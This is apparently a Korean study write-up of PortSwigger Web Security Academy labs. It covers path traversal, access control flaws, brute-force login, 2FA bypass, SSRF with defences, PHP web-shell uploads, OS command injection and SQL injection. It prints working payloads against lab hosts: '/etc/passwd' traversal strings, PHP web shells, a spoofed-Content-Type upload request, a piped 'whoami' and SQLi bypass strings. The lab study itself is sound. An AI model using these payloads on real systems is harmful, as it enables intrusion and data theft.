Server-side vulnerabilities (서버사이드 취약점)는 웹 애플리케이션의 **서버 내부에서 실행되는 로직**의 결함을 악용하는 보안 취약점입니다. 사용자가 직접 눈으로 보거나 조작할 수 없는 서버의 백엔드 처리 과정에서 발생하기 때문에, 공격이 성공하면 시스템 전체의 권한을 빼앗기거나 데이터베이스가 유출되는 등 **치명적인 피해**로 이어지는 경우가 많습니다.

- **SSRF (Server-Side Request Forgery)**: 공격자가 서버를 대리인(Proxy) 삼아 내부망이나 외부로 원치 않는 HTTP 요청을 보내게 만드는 취약점입니다. 외부에서 접근할 수 없는 내부 서버(관리자 페이지 등)를 공격할 때 쓰여요.
- **SSTI (Server-Side Template Injection)**: 사용자가 입력한 값이 서버 측 템플릿 엔진(Jinja2, Thymeleaf 등)에 검증 없이 삽입될 때 발생합니다. 이를 통해 서버에서 임의의 명령어(RCE)를 실행할 수 있게 됩니다.
- **파일 업로드 취약점 (File Upload Vulnerabilities)**: 공격자가 웹쉘(Web Shell) 같은 악성 스크립트 파일을 서버에 업로드하고 실행하여, 시스템 제어권을 탈취하는 대표적인 서버사이드 결함입니다.
- **역직렬화 취약점 (Insecure Deserialization)**: 서버가 신뢰할 수 없는 사용자 입력 데이터를 객체로 역직렬화하는 과정에서 악성 코드가 실행되도록 유도하는 취약점입니다.

1. path traversal 공격

문제중에 버프 프록시로 잡은 다음에 이미지 눌러서 GET /image?filename=../../../../etc/passwd HTTP/2, 즉 리피터 부분 페이로드를 저런식으로 줘서 인증하고, 파일 전부 나오게 성공!

2. access control 공격

**접근 제어(Access Control) 취약점**은 사용자가 시스템에서 무엇을 보고 어떤 권한으로 행동할 수 있는지를 서버가 제대로 검증하지 않아 발생하는 취약점입니다.

핵심 유형은 크게 두 가지로 나뉩니다.

- **수직적 접근 제어 취약점 (Vertical Access Control)**: 일반 사용자(User) 권한인 사람이 관리자(Admin)만 쓸 수 있는 기능이나 페이지에 접근하는 경우. (예: 주소창에 `/admin`을 직접 쳤더니 관리자 패널이 뜸)
- **수평적 접근 제어 취약점 (Horizontal Access Control)**: 같은 권한을 가진 사용자끼리 서로 다른 사람의 데이터에 접근하는 경우. (예: 내 계정 조회 URL인 `/account?id=100`에서 숫자를 `101`로 바꿨더니 타인의 개인정보가 뜸)

즉, "이 요청을 보낸 사람이 이 권한을 가져도 되는 사람이 맞는지", "다른 사람의 자원을 훔쳐보려고 요청값을 조작하진 않았는지" 서버가 철저히 확인(검증)하지 않을 때 발생하는 모든 보안 구멍을 뜻해요!

---

robots.txt

**검색엔진 봇(크롤러)에게 웹사이트의 어떤 페이지를 수집하게 할지, 어떤 페이지를 수집하지 말라고 할지(Allow/Disallow)** 그 범위를 지정해 주는 파일이 바로 `robots.txt`예요.

`robots.txt` 자체는 웹사이트 루트에 공개되어 있는 게 정상이기 때문에 '절대 노출되면 안 되는 파일'은 아니에요. 하지만 **여기에 민감한 경로를 적어두면 보안상 치명적인 위험**이 생기기 때문에 주의해야 해요.

- **검색엔진 제어 기능**: `User-agent: *` 와 `Disallow: /` 등을 통해 구글이나 네이버 같은 검색엔진 봇이 수집해가면 안 되는 개인정보 페이지나 불필요한 디렉토리를 필터링하는 역할을 해요.
- **공격자들의 정보 수집 꿀팁**: 문제는 일부 개발자들이 `Disallow: /super-secret-admin-page/` 처럼 **사람들에게 숨기고 싶은 관리자 페이지나 백엔드 경로**를 검색엔진에 안 뜨게 하려고 여기에 적어둔다는 점이에요.
- **보안 취약점의 단초**: `robots.txt`는 누구나 주소 뒤에 `/robots.txt`만 붙이면 1초 만에 볼 수 있는 공개 파일이기 때문에, 공격자들은 오히려 이 파일을 먼저 열어보고 **"아, 이 사이트에는 이런 숨겨진 관리자 경로가 있구나"** 하고 타겟팅을 시작해요. (보안을 은폐에만 의존하는 'Security through obscurity'의 대표적 실패 사례죠.)

2-2. **Unprotected admin functionality with unpredictable URL**

2-3 **User role controlled by request parameter**

먼저 로그인 하고 사이트 /admin 들어간 상태에서 버프로 잡고 하면 아래를 고쳐주기.

carlos잡을땐 또 한번 수정해주기

Cookie: Admin=false → 이부분 True하기

2-4 **Horizontal privilege escalation**

https://insecure-website.com/myaccount?id=123

이는 안전하지 않은 직접 객체 참조(IDOR) 취약점의 예입니다. 이러한 유형의 취약점은 사용자 컨트롤러 매개변수 값을 사용하여 리소스나 함수에 직접 접근할 때 발생합니다.

아이디 로그인하고 carlos글 찾고 해당 아래 아이디 누르면 https://0a8b009103c49a1f80eeeedd001100c7.web-security-academy.net/blogs?userId=e42ec204-e44e-4b9f-b6d6-947ba39182b9 이런거 나옴

다시 /my-account로 돌아가면 id형식이 바뀌어져있음 바뀐걸로 위에 아이디값을 넣어주면

api값이 나오고 그걸 주면됨

2-5 **Horizontal to vertical privilege escalation**

로그인 후 id값을 administrator로 수정후에 비번이 나오는데 버프로 잡아서 보면은 패스워드 저장이됨

다시 재로그인하여서, 로그인하고 패널가서 carlos지우기

2-6 **Authentication vulnerabilities**

## **무차별 대입 방식으로 사용자 이름 찾기**

사용자 이름은 이메일 주소처럼 쉽게 알아볼 수 있는 패턴을 따르는 경우 특히 추측하기 쉽습니다. 예를 들어, 회사 로그인 아이디는 흔히 `@username.com` 형식으로 되어 있는 것을 볼 수 있습니다 `firstname.lastname@somecompany.com`. 하지만 명확한 패턴이 없더라도, 때로는 높은 권한을 가진 계정조차도 `@username.com`이나 ` `admin`@username.com` 과 같이 예측 가능한 사용자 이름을 사용하여 생성되는 경우가 있습니다 `administrator`.

보안 감사를 진행할 때는 웹사이트에서 잠재적인 사용자 이름이 공개적으로 노출되는지 확인해야 합니다. 예를 들어, 로그인하지 않고도 사용자 프로필에 접근할 수 있는지 살펴보세요. 프로필의 실제 내용이 숨겨져 있더라도 프로필에 사용된 이름이 로그인 시 사용한 사용자 이름과 동일한 경우가 있습니다. 또한 HTTP 응답을 확인하여 이메일 주소가 노출되는지 확인해야 합니다. 간혹 응답에 관리자나 IT 지원 담당자와 같은 고위 권한 사용자의 이메일 주소가 포함되어 있는 경우가 있습니다.

**Username enumeration**

사용자 이름 열거는 공격자가 웹사이트의 동작 변화를 관찰하여 특정 사용자 이름이 유효한지 여부를 확인하는 방식입니다.

사용자 이름 열거 공격은 일반적으로 로그인 페이지에서, 예를 들어 유효한 사용자 이름을 입력했지만 비밀번호를 잘못 입력했을 때 또는 회원가입 양식에서 이미 사용 중인 사용자 이름을 입력했을 때 발생합니다. 공격자는 이러한 방식으로 유효한 사용자 이름 목록을 빠르게 생성할 수 있으므로 무차별 대입 공격에 필요한 시간과 노력을 크게 줄일 수 있습니다.

### 문제풀이

**Username enumeration via different responses**

정리: 이 랩은 **유저네임 먼저 특정**한 뒤, 그 유저네임으로 **패스워드를 브루트포스**하는 2단계 효율화 기법을 연습하는 과정입니다.

**1단계: 유저네임 찾기 (Username Enumeration)**

- **요청 포착:** 브라우저에서 아무 아이디나 패스워드를 넣고 로그인 시도 후, Burp Suite의 `Proxy > HTTP history`에서 `POST /login` 요청을 찾아 Intruder로 보냅니다 (`Send to Intruder`).
- **Payload 위치 지정:** Intruder의 Positions 탭에서 `username=§invalid-username§` 부분만 `§` 기호로 감싸고, 패스워드는 임의의 고정값으로 둡니다.
- **공격 설정:** Attack type을 **Sniper**로 설정하고, Payloads 탭에서 **Simple list**를 선택한 뒤 후보 유저네임 리스트를 붙여넣고 `Start attack`을 누릅니다.
- **결과 분석:** 새 창이 뜨면 **Length** 컬럼을 클릭해 정렬합니다. 다른 요청들과 길이가 다른 항목 하나가 눈에 띌 것입니다. 해당 응답을 확인해보면 다른 것들은 "Invalid username"이지만, 그 항목만 "Incorrect password"라는 메시지를 줍니다. 이 유저네임을 따로 적어둡니다.

**2단계: 패스워드 알아내기 (Password Brute-Force)**

- **위치 재설정:** Intruder 탭으로 다시 돌아와 Clear §를 눌러 기존 설정을 지웁니다.
- 찾은 유저네임은 고정값으로 입력하고, 패스워드 파라미터만 `§`로 감싸서 지정합니다: `username=identified-user&password=§invalid-password§`.
- **공격 설정:** Payloads 탭에서 기존 유저네임 리스트를 지우고 후보 **패스워드 리스트**를 붙여넣은 뒤 다시 `Start attack`을 실행합니다.
- **결과 분석:** 이번에는 **Status** 컬럼을 확인합니다. 대부분의 요청이 `200` 응답을 반환하지만, 유일하게 딱 하나만 **`302` (Redirect)** 응답을 받게 됩니다. 이것이 성공한 패스워드입니다.

다른 오류 찾기 팁

- **답 길이 (Length):** 가장 흔하게 활용되는 지표입니다. 유효한 계정이거나 올바른 패스워드일 경우 서버가 반환하는 에러 메시지(예: "Incorrect password" vs "Invalid username")나 성공 페이지의 HTML 구조가 미세하게 달라지면서 바이트 수 차이로 나타납니다.
- **상태 코드 (Status Code):** 이번 실습의 두 번째 단계처럼, 로그인 성공 시 보통 메인 페이지나 대시보드로 리다이렉트되면서 `302 Found` (또는 `303`, `303 See Other`) 상태 코드를 반환합니다. 실패 시에는 대개 에러 페이지를 그대로 보여주므로 `200 OK`가 유지됩니다.
- **응답 시간 (Response Time/Delay):** 서버가 내부적으로 올바른 계정일 때만 DB 조회나 추가 로직(예: 비밀번호 해시 검증)을 수행하느라 응답 속도가 미세하게 지연되는 경우, 시간 차이를 통해 유효한 값을 유추하기도 합니다.

**Bypassing two-factor authentication**

**취약점 원인**

- **서버 측 접근 제어 미흡 (Broken Access Control):** 2단계 인증(2FA) 단계를 거치는 도중, 사용자가 인증 코드 입력 페이지(`/login2` 등)에서 직접 계정 페이지(`my-account`)로 URL을 강제 변경했을 때 서버가 세션의 2FA 완료 여부를 제대로 검증하지 않고 곧바로 페이지 접근을 허용하기 때문에 발생합니다.

**실습 진행 요약**

- **1단계 (정상 로그인 및 URL 파악):** 본인 계정으로 로그인 후 2FA 코드를 거쳐 최종 도달하는 계정 페이지의 URL 구조를 파악합니다.
- **2단계 (우회 시도):** 로그아웃한 뒤 피해자(Target) 계정의 아이디와 패스워드로 로그인합니다. 2FA 코드 입력 화면이 나오면, 브라우저 주소창의 URL을 아까 메모해 둔 계정 페이지(`my-account`) 경로로 직접 수정하여 엔터를 칩니다.
- **3단계 (결과):** 서버가 추가 인증 단계를 강제하지 않고 곧바로 마이페이지를 렌더링하면서 랩이 해결됩니다.

---

### 이 랩에 핵심 개념 SSRF

## **SSRF란 무엇인가요?**

서버 측 요청 위조(SSRF)는 공격자가 서버 측 애플리케이션에 의도하지 않은 위치로 요청을 보내도록 유도하는 웹 보안 취약점입니다.

일반적인 SSRF 공격에서 공격자는 서버가 조직 인프라 내의 내부 전용 서비스에만 연결하도록 만들 수 있습니다. 또는 서버가 임의의 외부 시스템에 연결하도록 강제할 수도 있습니다. 이로 인해 인증 자격 증명과 같은 민감한 데이터가 유출될 수 있습니다.

문제풀이

## **로컬 서버를 대상으로 한 기본 SSRF 공격**

**1단계: '재고 확인' 요청 가로채기**

- 웹사이트의 임의의 **상품 상세 페이지**로 이동합니다.
- 페이지 하단의 **"Check stock"** 버튼을 누를 때 발생하는 요청을 Burp Suite(Proxy > HTTP history)에서 포착하여 **Burp Repeater**로 보냅니다(`Send to Repeater`).

**2단계: `stockApi` 파라미터 변조 (관리자 페이지 접근)**

- Repeater 탭에서 전달된 요청 본문이나 쿼리스트링 중 **`stockApi`** 파라미터를 찾습니다.
- 해당 파라미터의 값을 외부 접근이 차단된 로컬 주소인 `http://localhost/admin`으로 변경하고 **Send**를 누릅니다.
- 오른쪽 Response 창에서 관리자 페이지의 HTML 구조가 고스란히 출력되는 것을 확인합니다.

**3단계: carlos 계정 삭제 실행**

- 응답 HTML 내부에서 `carlos` 사용자를 삭제하는 엔드포인트(예: `/admin/delete?username=carlos`)를 찾습니다.
- 다시 `stockApi` 파라미터 값을 최종 타깃 경로인 `http://localhost/admin/delete?username=carlos`로 수정합니다.
- 요청을 전송(Send)하면 서버가 내부 네트워크를 통해 해당 삭제 요청을 처리하면서 랩이 깔끔하게 해결됩니다!

### ssrf 방어방법

- **화이트리스트 기반 URL 검증 (Allowlist):** 블랙리스트 방식은 우회 기법에 취약하므로, 반드시 허용된 도메인이나 IP 주소 목록만 명시적으로 허용하도록 구현합니다.
- **사설 IP 및 루프백 대역 차단:** 입력된 URL이 `127.0.0.1`, `localhost` 같은 루프백 주소나 사설 IP 대역(`10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`)을 가리키는지 정규식이나 IP 파싱 라이브러리로 검사하여 차단합니다.
- **위험한 프로토콜(Scheme) 제한:** `http`와 `https` 이외에 시스템 파일을 읽거나 다른 프로토콜을 악용할 수 있는 `file://`, `gopher://`, `dict://`, `ftp://` 등의 스킴 사용을 원천 차단합니다.
- **아웃바운드 트래픽 제어 (Egress Filtering):** 방화벽이나 네트워크 정책을 통해 애플리케이션 서버가 불필요한 내부망 대역이나 외부로 향하는 통신을 엄격하게 제한합니다.
- **HTTP 리디렉션 추적 비활성화:** 외부 URL에 요청을 보냈을 때 서버가 `3xx` 리디렉션을 자동으로 따라가며 내부망을 타격하는 우회 공격을 막기 위해 리디렉션 기능 자체를 끄거나 제한합니다.
- **내부 서비스 인증 체계 강화:** "내부망에 있으니 안전하다"는 신뢰 모델(Implicit Trust)에서 벗어나, 내부 API나 관리자 인터페이스 간 통신에도 별도의 인증 토큰이나 자격 증명을 요구하도록 설계합니다.

## **내부망 IP 스캔을 통한 SSRF (Subnet Brute-forcing)**

이번 랩은 단일

```
localhost
```

가 아니라

**내부망 대역(`192.168.0.1 ~ 255`)의 8080 포트**

에 관리자 페이지가 숨겨져 있습니다. Burp Intruder를 활용해 내부 대역 전체를 스캔하여 관리자가 존재하는 정확한 IP를 찾아내야 합니다.

```jsx
stockApi=http://192.168.0.§1§:8080/admin
```

넣고 payloads numbers 눌러서 0-255까지 실행

```jsx
- 길이순으로 정렬하는 방법: 결과 창 상단에 있는 Length 글자를 클릭해 보세요. 오름차순 또는 내림차순으로 정렬됩니다.
- 진짜 IP 찾는 법: Length를 클릭해서 정렬한 뒤, 수십 개씩 나오는 2581 바이트(또는 대다수와 다른) 사이에서 혼자만 길이가 완전히 다른 행을 찾으세요. 아까 보신 141 바이트처럼 튀는 행이 있다면, 그 행의 Payload 번호가 바로 진짜 관리자 IP의 마지막 숫자입니다.
```

---

### 파일 업로드 취약점

## **무제한 파일 업로드를 악용하여 웹 셸을 배포하는 방법**

보안 관점에서 최악의 시나리오는 웹사이트에서 PHP, Java, Python 파일과 같은 서버 측 스크립트를 업로드할 수 있도록 허용하고, 해당 스크립트를 코드로 실행하도록 설정되어 있는 경우입니다. 이렇게 되면 서버에 웹 셸을 손쉽게 만들 수 있게 됩니다.

#### **웹 셸**

웹 셸은 공격자가 올바른 엔드포인트로 HTTP 요청을 보내는 것만으로 원격 웹 서버에서 임의의 명령을 실행할 수 있도록 하는 악성 스크립트입니다.

웹 셸을 성공적으로 업로드할 수 있다면 서버에 대한 완전한 제어권을 확보하게 됩니다. 즉, 임의의 파일을 읽고 쓸 수 있고, 민감한 데이터를 유출할 수 있으며, 심지어 서버를 이용하여 내부 인프라 및 네트워크 외부의 다른 서버에 대한 공격을 개시할 수도 있습니다. 예를 들어, 다음 PHP 코드 한 줄을 사용하면 서버의 파일 시스템에서 임의의 파일을 읽을 수 있습니다.

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

일단 업로드되면, 이 악성 파일에 대한 요청을 보내면 응답으로 대상 파일의 내용이 반환됩니다.

보다 다양한 기능을 갖춘 웹 셸은 다음과 같은 모습일 수 있습니다.

```
<?php echo system($_GET['command']); ?>
```

이 스크립트를 사용하면 다음과 같이 쿼리 매개변수를 통해 임의의 시스템 명령을 전달할 수 있습니다.

```
GET /example/exploit.php?command=id HTTP/1.1
```

문제풀이

- **취약점 개요**: 아바타 업로드 기능에서 확장자 검증이 제대로 이루어지지 않아, 이미지 대신 악성 PHP 스크립트 파일을 업로드하고 서버에서 이를 실행(RCE)하여 카를로스의 비밀 파일(`secret`)을 탈취하는 포트스위거 랩입니다.
- **단계별 풀이 가이드**
    1. **아바타 업로드 및 확인**: 웹 계정에 로그인한 뒤 임의의 이미지를 업로드하고, 계정 페이지에서 아바타 미리보기가 뜨는 것을 확인합니다.
    2. **프록시 기록 필터링**: Burp Suite의 **Proxy > HTTP history**로 이동해 필터 창을 열고, **MIME type**에서 **Images**만 체크하여 필터를 적용합니다.
    3. **Repeater로 요청 전송**: 기록에서 아바타를 불러오는 `GET /files/avatars/<이미지파일명>` 요청을 찾아 **Repeater**로 보냅니다.
    4. **악성 PHP 파일 생성**: 시스템(또는 로컬 텍스트 편집기)에 카를로스의 비밀 파일을 읽어오는 아래 내용의 코드를 가진 `exploit.php` 파일을 생성합니다.PHP
        
        ```
        <?php echo file_get_contents('/home/carlos/secret'); ?>
        ```
        
    5. **파일 업로드**: 아바타 업로드 기능을 통해 방금 만든 `exploit.php` 파일을 업로드합니다. 업로드 성공 메시지를 확인합니다.
    6. **Repeater에서 경로 변경 및 실행**: Repeater로 보냈던 요청의 경로를 방금 업로드한 파일명으로 수정합니다.HTTP
        
        ```
        GET /files/avatars/exploit.php HTTP/2
        Host: 0a3800fb037bc4018255fb4c004f0029.web-security-academy.net
        Cookie: session=2wuJ9YaksJ7qhynd9zysnvoAqD7pjWS5
        Sec-Ch-Ua-Platform: "macOS"
        Accept-Language: ko-KR,ko;q=0.9
        Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
        Sec-Ch-Ua-Mobile: ?0
        Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: image
        Referer: https://0a3800fb037bc4018255fb4c004f0029.web-security-academy.net/my-account?id=wiener
        Accept-Encoding: gzip, deflate, br
        Priority: u=2, i
        ```
        
    7. **비밀 키 획득**: 요청을 전송하면 서버가 PHP 스크립트를 실행하여 응답으로 카를로스의 비밀 값(Secret)을 반환합니다. 이를 제출하여 랩을 완료합니다.

**실습: Content-Type 제한 우회를 통한 웹 셸 업로드**

- **해결 단계 요약**
    - **1단계**: `exploit.php` 파일을 업로드 시도합니다.
    - **2단계**: Burp Suite의 **Proxy > HTTP history**에서 `POST /my-account/avatar` 요청을 찾아 **Repeater**로 보냅니다.
    - **3단계**: Repeater 요청 본문(Body)에서 파일 파트의 `Content-Type: application/php` (또는 지정된 값) 부분을 **`image/jpeg`** 또는 `image/png`로 수정합니다.
    
    ```jsx
    POST /my-account/avatar HTTP/2
    Host: 0ac400df039832ef8142c196004f0089.web-security-academy.net
    Cookie: session=1hb9F3lTIyyMKRuSy21atjQO0xjO2fmw
    Content-Length: 462
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: ko-KR,ko;q=0.9
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykhfcumnicBMzjpg8
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
    Origin: https://0ac400df039832ef8142c196004f0089.web-security-academy.net
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0ac400df039832ef8142c196004f0089.web-security-academy.net/my-account?id=wiener
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    
    ------WebKitFormBoundarykhfcumnicBMzjpg8
    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
    Content-Type: image/jpeg
    
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ------WebKitFormBoundarykhfcumnicBMzjpg8
    Content-Disposition: form-data; name="user"
    
    wiener
    ------WebKitFormBoundarykhfcumnicBMzjpg8
    Content-Disposition: form-data; name="csrf"
    
    XWErNMG7CT1UyH0MyEo6dJgo18dimEB1
    ------WebKitFormBoundarykhfcumnicBMzjpg8--
    
    ```
    
    - **4단계**: 요청을 보내 업로드가 성공(`200 OK` 또는 성공 메시지)하는 것을 확인합니다.
    - **5단계**: 아까처럼 `GET /files/avatars/exploit.php` 요청을 날려 비밀 키를 획득합니다.

---

## **OS command injection**

**1. 요청 캡처 및 Repeater 이동**

- 웹사이트 상품 상세 페이지에서 **Check stock** 버튼을 클릭합니다.
- Burp Suite의 **Proxy > HTTP history**에서 해당 요청을 찾아 우클릭한 뒤 **Send to Repeater**를 선택합니다.

**2. `storeId` 파라미터 수정**

- Repeater 탭의 요청 데이터 영역에서 `storeId` 값을 찾습니다. (예: `storeId=1`)
- 해당 값을 `storeId=1|whoami`로 변경합니다. (파이프 기호 `|`는 앞의 명령어가 끝난 뒤 이어지는 OS 명령어를 연달아 실행하도록 만듭니다.)

**3. 응답 확인**

- 상단의 **Send** 버튼을 눌러 요청을 전송합니다.
- 하단 응답(Response) 창에 현재 시스템의 사용자 이름이 원시 텍스트 형태로 출력되는지 확인합니다.

---

## **SQL injection (SQLi)?**

기본 sql인젝션 문제

- **제품 카테고리 요청 캡처**
웹사이트 메인 페이지에서 특정 카테고리(예: Gifts)를 클릭할 때 발생하는 요청을 Burp Suite(Proxy > Intercept)로 가로챕니다.
- **Repeater로 요청 보내기**
가로챈 요청을 우클릭하여 **Send to Repeater**를 누른 뒤, Repeater 탭으로 이동합니다.
- **`category` 파라미터 조작**
요청 중 카테고리를 지정하는 파라미터 값(예: `category=Gifts`)을 **`category=Gifts'+OR+1=1--`** 형태로 수정합니다.
*(이때 따옴표로 기존 쿼리의 문자열을 닫고, `OR 1=1` 조건을 추가하여 항상 참이 되도록 만든 뒤 `-` 주석 처리 기호로 뒤의 쿼리를 무력화합니다.)*

```jsx
GET /filter?category=Tech+gifts'+OR+1=1-- HTTP/2
```

- **응답 확인**
상단의 **Send** 버튼을 눌러 요청을 전송하고, 하단 응답 창에 출시 여부와 상관없이(`released = 1` 조건이 무력화되어) 미출시 제품까지 포함된 여러 제품 목록이 출력되는지 확인합니다.

**로그인 우회를 허용하는 SQL 인젝션 취약점**

1. Burp Suite를 사용하여 로그인 요청을 가로채고 수정하세요.
2. 매개변수를 수정 `usernameadministrator'--`
    
    하여 값을 지정하십시오.
